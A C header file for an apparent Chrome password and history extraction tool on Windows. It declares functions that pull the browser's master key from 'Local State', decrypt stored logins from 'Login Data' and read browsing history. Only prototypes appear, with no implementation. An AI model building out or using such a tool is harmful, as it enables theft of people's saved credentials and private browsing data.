#pragma once
#include <stdio.h>
#include <Windows.h>
#include "sqlite3.h"
#include <wincrypt.h>
#include <string.h>
#include <sodium.h>

#define MAX_LINE_LENGTH 1024
#define MAX_PATH_LENGTH 256
#define IV_SIZE 12

#define error(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__) 
#define info(msg, ...)  printf("[+] " msg "\n", ##__VA_ARGS__) 
#define okay(msg, ...)  printf("[*] " msg "\n", ##__VA_ARGS__) 


void chrome(char* localstate, char* loginData, char* History);

int extract_base64_key(const char* filepath, char* key);
BYTE* base64_decode(const char* base64_key, DWORD* decoded_len);
char* getMasterKey(const char* locatStatePath);
int extract_base64_key(const char* filepath, char* key);
int decrypt_password(const BYTE* encrypted_password, DWORD len, unsigned char* decrypted_password, int max_len);
int get_password(char* filename, DATA_BLOB masterKey, int choice);
int get_history(char* filename, int choice);
DATA_BLOB Decrypt(const char* encrypted_data, DWORD encrypted_len);
